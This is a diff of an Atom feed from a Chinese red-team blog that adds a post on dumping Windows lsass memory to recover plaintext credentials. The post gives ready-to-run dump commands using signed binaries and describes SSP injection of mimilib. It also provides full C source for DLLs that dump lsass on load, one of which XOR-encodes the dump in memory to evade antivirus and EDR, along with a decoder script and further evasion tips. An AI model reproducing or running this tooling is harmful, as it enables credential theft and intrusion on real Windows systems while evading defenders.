@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://redteamblog.icu</id>
     <title>毅种循环的洗剑录</title>
-    <updated>2022-04-29T08:45:48.136Z</updated>
+    <updated>2022-04-29T08:48:12.664Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://redteamblog.icu"/>
     <link rel="self" href="https://redteamblog.icu/atom.xml"/>
@@ -11,6 +11,482 @@
     <logo>https://redteamblog.icu/images/avatar.png</logo>
     <icon>https://redteamblog.icu/favicon.ico</icon>
     <rights>All rights reserved 2022, 毅种循环的洗剑录</rights>
+    <entry>
+        <title type="html"><![CDATA[一些获取Windows明文凭据的方法]]></title>
+        <id>https://redteamblog.icu/post/41016eb03b2343a69a9be35f251f1e9c/</id>
+        <link href="https://redteamblog.icu/post/41016eb03b2343a69a9be35f251f1e9c/">
+        </link>
+        <updated>2022-04-29T06:35:55.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="一些获取windows明文凭据的方法">一些获取Windows明文凭据的方法</h1>
+<ul>
+<li><a href="https://loong716.top/posts/lsass/#0x00-%E6%96%B9%E6%B3%95">0x00 方法</a>
+<ul>
+<li><a href="https://loong716.top/posts/lsass/#1-mimikatz%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96lsass">1. Mimikatz直接读取Lsass</a></li>
+<li><a href="https://loong716.top/posts/lsass/#2-%E7%AD%BE%E5%90%8D%E7%99%BD%E5%90%8D%E5%8D%95%E6%96%87%E4%BB%B6dump">2. 签名/白名单文件Dump</a>
+<ul>
+<li><a href="https://loong716.top/posts/lsass/#1-avdumpexe">(1) AvDump.exe</a></li>
+<li><a href="https://loong716.top/posts/lsass/#2-createdumpexe">(2) CreateDump.exe</a></li>
+<li><a href="https://loong716.top/posts/lsass/#3-rundll32exe">(3) Rundll32.exe</a></li>
+</ul>
+</li>
+<li><a href="https://loong716.top/posts/lsass/#3-%E5%88%A9%E7%94%A8silentprocessexit%E8%BF%9B%E8%A1%8Cdump">3. 利用SilentProcessExit进行Dump</a></li>
+<li><a href="https://loong716.top/posts/lsass/#4-%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84ssp">4. 添加自定义的SSP</a>
+<ul>
+<li><a href="https://loong716.top/posts/lsass/#1-%E4%BD%BF%E7%94%A8memssp%E5%AF%B9lsass%E8%BF%9B%E8%A1%8Cpatch">(1) 使用MemSSP对lsass进行patch</a></li>
+<li><a href="https://loong716.top/posts/lsass/#2-%E4%BD%BF%E7%94%A8addsecuritypackage%E5%8A%A0%E8%BD%BDssp">(2) 使用AddSecurityPackage加载SSP</a></li>
+<li><a href="https://loong716.top/posts/lsass/#3-%E9%80%9A%E8%BF%87rpc%E5%8A%A0%E8%BD%BDssp">(3) 通过RPC加载SSP</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://loong716.top/posts/lsass/#0x01-%E5%AE%9E%E7%8E%B0">0x01 实现</a>
+<ul>
+<li><a href="https://loong716.top/posts/lsass/#1-%E7%BC%96%E5%86%99dump-lsass%E7%9A%84dll">1. 编写Dump Lsass的DLL</a></li>
+<li><a href="https://loong716.top/posts/lsass/#2-%E5%B0%86dll%E4%B8%8Eexe%E6%96%87%E4%BB%B6%E6%89%93%E5%8C%85">2. 将DLL与EXE文件打包</a></li>
+<li><a href="https://loong716.top/posts/lsass/#3-%E5%B0%86%E8%BF%9B%E7%A8%8Bdump%E5%88%B0%E5%86%85%E5%AD%98">3. 将进程dump到内存</a></li>
+<li><a href="https://loong716.top/posts/lsass/#4-x86%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8rpc%E5%8A%A0%E8%BD%BDssp">4. x86环境下利用RPC加载SSP</a></li>
+<li><a href="https://loong716.top/posts/lsass/#5-%E5%85%B6%E5%AE%83%E5%8F%AF%E8%83%BD%E7%94%A8%E5%88%B0%E7%9A%84%E4%BC%98%E5%8C%96%E6%80%9D%E8%B7%AF">5. 其它可能用到的优化思路</a></li>
+</ul>
+</li>
+<li><a href="https://loong716.top/posts/lsass/#0x02-%E5%8F%AF%E8%83%BD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98">0x02 可能遇到的问题</a>
+<ul>
+<li><a href="https://loong716.top/posts/lsass/#1-%E7%BC%BA%E5%B0%91vc%E8%BF%90%E8%A1%8C%E5%BA%93">1. 缺少VC运行库</a></li>
+<li><a href="https://loong716.top/posts/lsass/#2-dump%E6%96%87%E4%BB%B6%E4%BD%93%E7%A7%AF%E8%BF%87%E5%A4%A7">2. dump文件体积过大</a></li>
+</ul>
+</li>
+<li><a href="https://loong716.top/posts/lsass/#0x03-%E6%80%BB%E7%BB%93">0x03 总结</a></li>
+</ul>
+<p>获取Windows用户的凭证信息是渗透过程中至关重要的一步，与杀软的对抗也在不断升级</p>
+<p>本文对常见的Dump Lsass/获取明文凭据的方法进行简单的总结，以应对实战中各种各样的场景</p>
+<h2 id="0x00-方法">0x00 方法</h2>
+<h3 id="1-mimikatz直接读取lsass">1. Mimikatz直接读取Lsass</h3>
+<blockquote>
+<p>优点：</p>
+<ul>
+<li>方便快捷</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>mimikatz必须免杀</li>
+<li>无法绕过部分AV对lsass的监控</li>
+</ul>
+</blockquote>
+<p>经典姿势，使用mimikatz的<code>sekurlsa::logonpasswords</code></p>
+<p>其实是调用<code>ReadProcessMemory</code>来将lsass进程读入内存中的另一个地址中，然后对进程进行解析：</p>
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2021/03/27/EspZH8xKkmwj3Uc.png" alt="https://i.loli.net/2021/03/27/EspZH8xKkmwj3Uc.png" loading="lazy"></figure>
+<h3 id="2-签名白名单文件dump">2. 签名/白名单文件Dump</h3>
+<blockquote>
+<p>优点：</p>
+<ul>
+<li>程序拥有合法签名</li>
+<li>远程Dump后下载到本地离线解析，减少特征</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>虽然有签名但部分AV仍会发出警告</li>
+<li>无法绕过部分AV对lsass的监控</li>
+<li>dump得到的内存转储文件可能触发报警</li>
+</ul>
+</blockquote>
+<p>主要有以下几个程序：</p>
+<ol>
+<li>Procdump.exe</li>
+<li>SqlDumper.exe</li>
+<li>AvDump.exe</li>
+<li>createdump.exe</li>
+<li>rundll32.exe</li>
+</ol>
+<p>其中1、2、4这三个工具是有微软签名的，3是有杀软厂商Avast的签名，rundll32这个LOLBIN就不用说了</p>
+<p>前两个工具的用法已经是老生常谈了，网上也有很多文章，主要讨论后三个</p>
+<p>**PS：**注意使用这些工具的时候最好是system权限，如果是administrator的话要注意是否有<code>SeDebugPrivilege</code>，如果没有的话可以在命令前使用<code>powershell -c</code></p>
+<h3 id="1-avdumpexe">(1) AvDump.exe</h3>
+<p>AvDump.exe是杀软Avast自带的一个程序，该程序可以用来dump进程的内存，拥有Avast的签名</p>
+<pre><code>.\AvDump.exe --pid &lt;lsass pid&gt; --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\Users\admin\Desktop\lsass.dmp --min_interval 0
+
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2021/03/27/pWHXrZV5wutbvSO.png" alt="https://i.loli.net/2021/03/27/pWHXrZV5wutbvSO.png" loading="lazy"></figure>
+<h3 id="2-createdumpexe">(2) CreateDump.exe</h3>
+<blockquote>
+<p>createdump.exe随着.NET5出现的，本身是个native binary</p>
+</blockquote>
+<p>虽然createdump.exe是随着.NET5出现的，但因为它是native binary，所以执行时并不需要依赖.NET5的环境</p>
+<pre><code>createdump.exe -u -f lsass.dmp &lt;lsass pid&gt;
+
+</code></pre>
+<h3 id="3-rundll32exe">(3) Rundll32.exe</h3>
+<p>其实就是使用rundll32直接执行comsvcs.dll的导出函数<code>MiniDump</code>来Dump进程内存</p>
+<pre><code>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Users\admin\Desktop\lsass-comsvcs.dmp full
+
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2021/03/27/l1KjZJ3BINMXu4Q.png" alt="https://i.loli.net/2021/03/27/l1KjZJ3BINMXu4Q.png" loading="lazy"></figure>
+<h3 id="3-利用silentprocessexit进行dump">3. 利用SilentProcessExit进行Dump</h3>
+<blockquote>
+<p>优点：</p>
+<ul>
+<li>系统正常行为</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>需要写注册表</li>
+</ul>
+</blockquote>
+<p>很久之前看到过让系统蓝屏，然后通过windbg调试系统崩溃文件来读取lsass进程，但个人感觉这种方法风险过大，并且产生的崩溃文件的体积非常大，在实战中的应用情况有限</p>
+<p>直到不久前看到了一篇文章使用SilentProcessExit来使lsass静默退出，进而dump进程内存的方法，具体原理可以看文章：</p>
+<p><a href="https://mp.weixin.qq.com/s/8uEr5dNaQs24KuKxu5Yi9w">利用SilentProcessExit机制dump内存</a></p>
+<blockquote>
+<p>Silent Process Exit，即静默退出。而这种调试技术，可以派生 werfault.exe进程，可以用来运行任意程序或者也可以用来转存任意进程的内存文件或弹出窗口。</p>
+</blockquote>
+<p>实际测试中，该方法确实可以dump lsass的进程内存</p>
+<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2021/03/27/iPhRcXFmG2jgOHy.png" alt="https://i.loli.net/2021/03/27/iPhRcXFmG2jgOHy.png" loading="lazy"></figure>
+<p>但在卡巴斯基环境下，不会报警但dump文件为0kb(猜测是卡巴拒绝系统行为转储lsass进程)</p>
+<p>而遇到defender+360的情况下，同样不会触发报警，但该程序无法修改注册表项</p>
+<h3 id="4-添加自定义的ssp">4. 添加自定义的SSP</h3>
+<h3 id="1-使用memssp对lsass进行patch">(1) 使用MemSSP对lsass进行patch</h3>
+<blockquote>
+<p>优点：</p>
+<ul>
+<li>不需要重启服务器</li>
+<li>Lsass进程中不会出现可疑的DLL</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>需要调用WriteProcessMemory对lsass进行操作，可能会被标记</li>
+</ul>
+</blockquote>
+<p>该方法的大概原理是，通过打开lsass进程的句柄，然后搜索<code>msv1_0.dll</code>（支持交互式身份验证的DLL），找到之后对其中的<code>SpAcceptCredentials</code>函数进行hook，当用户进行认证时在<code>SpAcceptCredentials</code>函数第一行会首先<code>jmp</code>到我们的函数，将凭证写入文件后再跳回原函数</p>
+<p>当我们执行后，尝试用户身份认证，可以看到密码被记录在mimilsa.txt中：</p>
+<figure data-type="image" tabindex="5"><img src="https://i.loli.net/2021/03/27/uR1vOQV8gI3kUNa.png" alt="https://i.loli.net/2021/03/27/uR1vOQV8gI3kUNa.png" loading="lazy"></figure>
+<p>lsass的进程中并不存在异常的DLL：</p>
+<figure data-type="image" tabindex="6"><img src="https://i.loli.net/2021/03/27/li3oWywEYeKbUnT.png" alt="https://i.loli.net/2021/03/27/li3oWywEYeKbUnT.png" loading="lazy"></figure>
+<h3 id="2-使用addsecuritypackage加载ssp">(2) 使用AddSecurityPackage加载SSP</h3>
+<blockquote>
+<p>优点：</p>
+<ul>
+<li>可以绕过部分杀软对lsass的监控</li>
+<li>可以加载mimilib来记录密码以应对版本大于等于Windows Server 2012的情况</li>
+<li>不需要重启服务器</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>需要写注册表</li>
+<li>需要将SSP的dll拷贝到system32下（这个说缺点似乎也谈不上）</li>
+<li>Blue Team可以通过枚举SSP来发现我们自定义的SSP，并且lsass进程中可以看到加载的DLL</li>
+</ul>
+</blockquote>
+<p>SSP和SSPI的知识就不谈了，添加SSP需要以下操作：</p>
+<ol>
+<li>将mimilib.dll复制到<code>c:\windows\system32</code>下</li>
+<li>将<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\</code>处Security Packages的值设置为mimilib.dll</li>
+<li>调用<code>AddSecurityPackage</code>添加SSP</li>
+</ol>
+<p>相关代码可以参考：<a href="https://github.com/lengjibo/RedTeamTools/blob/master/windows/CredSSP/CredSSP/CredSSP.cpp">CredSSP</a></p>
+<p>这里直接使用**@lengyi**师傅的代码，运行后会将存放在资源区的mimilib.dll释放到当前目录，然后移动到system32下，修改注册表，最终调用<code>AddSecurityPackage</code>添加ssp：</p>
+<figure data-type="image" tabindex="7"><img src="https://i.loli.net/2021/03/27/rSx41WZYDa7gU62.png" alt="https://i.loli.net/2021/03/27/rSx41WZYDa7gU62.png" loading="lazy"></figure>
+<p>可以看到lsass进程加载了mimilib.dll：</p>
+<figure data-type="image" tabindex="8"><img src="https://i.loli.net/2021/03/27/DldwTOUJGg4nWhr.png" alt="https://i.loli.net/2021/03/27/DldwTOUJGg4nWhr.png" loading="lazy"></figure>
+<h3 id="3-通过rpc加载ssp">(3) 通过RPC加载SSP</h3>
+<blockquote>
+<p>优点：</p>
+<ul>
+<li>可以绕过杀软对lsass的监控</li>
+<li>可以加载mimilib来记录密码以应对版本大于等于Windows Server 2012的情况</li>
+<li>不需要重启服务器</li>
+<li>不需要写注册表</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>因为没有写注册表，所以无法持久化，如果目标机器重启的话将无法记录密码（因此个人认为比较适合在Server上用，不适合在PC上用）</li>
+</ul>
+</blockquote>
+<p>可以参考xpn关于mimikatz的系列文章：</p>
+<p><a href="https://blog.xpnsec.com/exploring-mimikatz-part-1/">exploring-mimikatz-part-1</a></p>
+<p><a href="https://blog.xpnsec.com/exploring-mimikatz-part-2/">exploring-mimikatz-part-2</a></p>
+<p>原理简单的来讲就是，xpn发现<code>AddSecurityPackage()</code>在被调用时会使用RPC（xpn的原文中说到：这是有道理的，因为这一调用需要向lsass发出信号来表明需要加载新的SSP）</p>
+<p>因此可以通过调试获取传递给RPC的数据，进而可以发起RPC调用，而不用使用<code>AddSecurityPackage()</code>这个API去调用</p>
+<p>加载的dll可以是直接dump lsass的，也可以是加载mimilib这种记录密码的</p>
+<figure data-type="image" tabindex="9"><img src="https://i.loli.net/2021/03/27/l57ZiWOAbNYfId8.png" alt="https://i.loli.net/2021/03/27/l57ZiWOAbNYfId8.png" loading="lazy"></figure>
+<h2 id="0x01-实现">0x01 实现</h2>
+<p>一些Dump Lsass方法or技巧的简单实现，以及实战中的一些优化</p>
+<h3 id="1-编写dump-lsass的dll">1. 编写Dump Lsass的DLL</h3>
+<p>需要以下几步操作：</p>
+<ol>
+<li>获取Debug权限</li>
+<li>找到lsass的PID</li>
+<li>使用MiniDump或MiniDumpWriteDump进行内存dump</li>
+</ol>
+<p>这个逻辑很简单，其中获取debug权限和自动寻找lsass的PID网上也有不少的Demo，所以很好实现</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;Windows.h&gt;
+#include &lt;tlhelp32.h&gt;
+
+typedef HRESULT(WINAPI* _MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);
+
+int GetLsassPid() {
+
+	PROCESSENTRY32 entry;
+	entry.dwSize = sizeof(PROCESSENTRY32);
+
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+	if (Process32First(hSnapshot, &amp;entry)) {
+		while (Process32Next(hSnapshot, &amp;entry)) {
+			if (wcscmp(entry.szExeFile, L&quot;lsass.exe&quot;) == 0) {
+				return entry.th32ProcessID;
+			}
+		}
+	}
+
+	CloseHandle(hSnapshot);
+	return 0;
+}
+
+void GetDebugPrivilege()
+{
+	BOOL fOk = FALSE;
+	HANDLE hToken;
+	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))
+	{
+		TOKEN_PRIVILEGES tp;
+		tp.PrivilegeCount = 1;
+		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);
+		tp.Privileges[0].Attributes = true ? SE_PRIVILEGE_ENABLED : 0;
+		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);
+		fOk = (GetLastError() == ERROR_SUCCESS);
+		CloseHandle(hToken);
+	}
+}
+
+void DumpLsass()
+{
+	wchar_t  ws[100];
+	_MiniDumpW MiniDumpW;
+	
+	MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L&quot;comsvcs.dll&quot;), &quot;MiniDumpW&quot;);
+	swprintf(ws, 100, L&quot;%u %hs&quot;, GetLsassPid(), &quot;c:\\windows\\temp\\temp.bin full&quot;);
+
+	GetDebugPrivilege();
+
+	MiniDumpW(0, 0, ws);
+}
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+		DumpLsass();
+		break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+</code></pre>
+<p>我们先拿rundll32测试一下，成功dump了lsass进程：</p>
+<figure data-type="image" tabindex="10"><img src="https://i.loli.net/2021/03/27/NiSnL7O3KIzXBa1.png" alt="https://i.loli.net/2021/03/27/NiSnL7O3KIzXBa1.png" loading="lazy"></figure>
+<p>然后使用利用RPC加载SSP的方式来转储lsass的进程内存：</p>
+<figure data-type="image" tabindex="11"><img src="https://i.loli.net/2021/03/27/aNelHhgcySV5RJo.png" alt="https://i.loli.net/2021/03/27/aNelHhgcySV5RJo.png" loading="lazy"></figure>
+<p>成功绕过卡巴斯基对lsass的监控</p>
+<h3 id="2-将dll与exe文件打包">2. 将DLL与EXE文件打包</h3>
+<p>我们在使用该方法时需要上传exe和dll，并且XPN原版的代码需要将SSP DLL的绝对路径作为参数传入，在使用时非常不方便</p>
+<p>因此我们可以将DLL放入exe的资源节区，然后在运行时释放到程序所在目录，加载完成后再删除DLL</p>
+<p>成功dump lsass进程的内存：</p>
+<figure data-type="image" tabindex="12"><img src="https://i.loli.net/2021/03/27/cDC86MSWHNRqFZ2.png" alt="https://i.loli.net/2021/03/27/cDC86MSWHNRqFZ2.png" loading="lazy"></figure>
+<p>关于将文件添加到资源区并释放可以参考：<a href="https://blog.csdn.net/dengdao1372/article/details/101230640">C++实现第三方资源释放与载入过程（以DLL为例）</a></p>
+<h3 id="3-将进程dump到内存">3. 将进程dump到内存</h3>
+<p>部分AV/EDR会监控我们dump下来的进程转储文件，因此我们有时需要将进程dump到一块内存中，进行加密后再写入磁盘，或者直接通过网络进行传输</p>
+<p>主要利用的是<code>MiniDumpWriteDump</code>的回调函数来实现该操作</p>
+<p>我这里借鉴了<code>@ired.team</code>的代码（<a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass#minidumpwritedump-to-memory-using-minidump-callbacks">文章戳这里</a>），并在内存中对进程转储数据进行与<code>0x32</code>的按位异或，通过编译为dll然后使用rundll32加载</p>
+<pre><code class="language-c">// dllmain.cpp : Defines the entry point for the DLL application.
+#include &quot;pch.h&quot;
+#include &lt;windows.h&gt;
+#include &lt;DbgHelp.h&gt;
+#include &lt;iostream&gt;
+#include &lt;TlHelp32.h&gt;
+#include &lt;processsnapshot.h&gt;
+#pragma comment (lib, &quot;Dbghelp.lib&quot;)
+
+LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
+DWORD bytesRead = 0;
+
+int GetLsassPid() {
+
+	PROCESSENTRY32 entry;
+	entry.dwSize = sizeof(PROCESSENTRY32);
+
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+	if (Process32First(hSnapshot, &amp;entry)) {
+		while (Process32Next(hSnapshot, &amp;entry)) {
+			if (wcscmp(entry.szExeFile, L&quot;lsass.exe&quot;) == 0) {
+				return entry.th32ProcessID;
+			}
+		}
+	}
+
+	CloseHandle(hSnapshot);
+	return 0;
+}
+
+void GetDebugPrivilege()
+{
+	BOOL fOk = FALSE;
+	HANDLE hToken;
+	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))
+	{
+		TOKEN_PRIVILEGES tp;
+		tp.PrivilegeCount = 1;
+		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);
+		tp.Privileges[0].Attributes = true ? SE_PRIVILEGE_ENABLED : 0;
+		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);
+		fOk = (GetLastError() == ERROR_SUCCESS);
+		CloseHandle(hToken);
+	}
+}
+
+BOOL CALLBACK minidumpCallback(
+	__in     PVOID callbackParam,
+	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
+	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
+)
+{
+	LPVOID destination = 0, source = 0;
+	DWORD bufferSize = 0;
+
+	switch (callbackInput-&gt;CallbackType)
+	{
+	case IoStartCallback:
+		callbackOutput-&gt;Status = S_FALSE;
+		break;
+
+		// Gets called for each lsass process memory read operation
+	case IoWriteAllCallback:
+		callbackOutput-&gt;Status = S_OK;
+
+		// A chunk of minidump data that's been jus read from lsass. 
+		// This is the data that would eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want with it.
+		// We will simply save it to dumpBuffer.
+		source = callbackInput-&gt;Io.Buffer;
+
+		// Calculate location of where we want to store this part of the dump.
+		// Destination is start of our dumpBuffer + the offset of the minidump data
+		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput-&gt;Io.Offset);
+
+		// Size of the chunk of minidump that's just been read.
+		bufferSize = callbackInput-&gt;Io.BufferBytes;
+		bytesRead += bufferSize;
+
+		RtlCopyMemory(destination, source, bufferSize);
+
+		break;
+
+	case IoFinishCallback:
+		callbackOutput-&gt;Status = S_OK;
+		break;
+
+	default:
+		return true;
+	}
+	return TRUE;
+}
+
+void DumpLsass()
+{
+	DWORD lsassPID = GetLsassPid();
+	DWORD bytesWritten = 0;
+	
+	// Set up minidump callback
+	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
+	ZeroMemory(&amp;callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
+	callbackInfo.CallbackRoutine = &amp;minidumpCallback;
+	callbackInfo.CallbackParam = NULL;
+
+	GetDebugPrivilege();
+
+	HANDLE lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
+	// Dump lsass
+	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &amp;callbackInfo);
+
+	for (DWORD i = 0; i &lt; bytesRead; i++)
+	{
+		*((BYTE*)dumpBuffer + i) ^= 0x32;
+	}
+
+	// At this point, we have the lsass dump in memory at location dumpBuffer - we can do whatever we want with that buffer, i.e encrypt &amp; exfiltrate
+	HANDLE outFile = CreateFile(L&quot;c:\\temp\\temp.bin&quot;, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	// For testing purposes, let's write lsass dump to disk from our own dumpBuffer and check if mimikatz can work it
+	WriteFile(outFile, dumpBuffer, bytesRead, &amp;bytesWritten, NULL);
+}
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+		DumpLsass();
+		break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+</code></pre>
+<p>最终得到的temp.bin如下，左边是使用procdump得到的未加密的进程转储文件：</p>
+<figure data-type="image" tabindex="13"><img src="https://i.loli.net/2021/03/27/5ZCMUO7PJfn2YEj.png" alt="https://i.loli.net/2021/03/27/5ZCMUO7PJfn2YEj.png" loading="lazy"></figure>
+<p>我们可以编写一个python脚本来将文件解密回来</p>
+<pre><code class="language-c">with open(&quot;C:\\Temp\\temp.bin&quot;, &quot;rb&quot;) as f1:
+    with open(&quot;C:\\Temp\\temp2.bin&quot;, &quot;ab&quot;) as f2:
+        data = f1.read()
+        print(len(data))
+        for i in range(len(data)):
+            newData = 0x32 ^ data[i]
+            f2.write(bytes([newData]))
+</code></pre>
+<p>可以使用mimikatz成功读取：</p>
+<figure data-type="image" tabindex="14"><img src="https://i.loli.net/2021/03/27/dxlhDWC9e8T1pfA.png" alt="https://i.loli.net/2021/03/27/dxlhDWC9e8T1pfA.png" loading="lazy"></figure>
+<h3 id="4-x86环境下利用rpc加载ssp">4. x86环境下利用RPC加载SSP</h3>
+<p><strong>TODO</strong></p>
+<h3 id="5-其它可能用到的优化思路">5. 其它可能用到的优化思路</h3>
+<ol>
+<li>Dump进程的敏感API通过动态调用/API Hashing技术来规避静态检测</li>
+<li>编写自己的dump函数，部分敏感API使用Direct Syscall</li>
+<li>与C2结合，dump的文件/读取的hash直接回传</li>
+</ol>
+<h2 id="0x02-可能遇到的问题">0x02 可能遇到的问题</h2>
+<h3 id="1-缺少vc运行库">1. 缺少VC运行库</h3>
+<p>在某次授权渗透测试中，出现目标机器缺失VC运行库的问题：</p>
+<figure data-type="image" tabindex="15"><img src="https://i.loli.net/2021/03/27/1S7h2u8WyB3vrbJ.png" alt="https://i.loli.net/2021/03/27/1S7h2u8WyB3vrbJ.png" loading="lazy"></figure>
+<p>设置项目为静态链接程序所需要的运行库即可，如下图所示：</p>
+<figure data-type="image" tabindex="16"><img src="https://i.loli.net/2021/03/27/azJCfiHu5sU2yDF.png" alt="https://i.loli.net/2021/03/27/azJCfiHu5sU2yDF.png" loading="lazy"></figure>
+<p>成功运行，目标环境中存在卡巴斯基EDR，最终成功dump lsass</p>
+<figure data-type="image" tabindex="17"><img src="https://i.loli.net/2021/03/27/3he96KZ1BRUNAn2.png" alt="https://i.loli.net/2021/03/27/3he96KZ1BRUNAn2.png" loading="lazy"></figure>
+<h3 id="2-dump文件体积过大">2. dump文件体积过大</h3>
+<p>有时我们可能会打到不出网的服务器，而此时我们又没有稳定的代理（Regeorg这些速度太慢），仅仅有一个webshell来下载大于30M的文件是十分不稳定的</p>
+<p>个人一般的思路就是：</p>
+<ul>
+<li>免杀mimikatz或提取sekurlsa模块，将工具传上去读</li>
+<li>上传7z.exe&amp;&amp;7z.dll，将文件进行分卷压缩再下载</li>
+</ul>
+<p>也想过直接把读取的功能写入SSP DLL里，然后结果输出到磁盘，但还未进行尝试，先算作一种思路吧</p>
+<h2 id="0x03-总结">0x03 总结</h2>
+<ul>
+<li>无杀软随便玩，直接mimikatz上去读就是</li>
+<li>无监控lsass的AV/EDR，可以通过免杀mimikatz进行直接读取，也可以使用白名单程序进行dump（需要注意部分杀软会对白名单程序报警）</li>
+<li>如果是卡巴这种监控lsass的，最好是使用加载SSP的方式，优缺点参考前面的，可以根据不同情况使用不同的方法</li>
+</ul>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Kerberos认证协议学习]]></title>
         <id>https://redteamblog.icu/post/kerberos/</id>
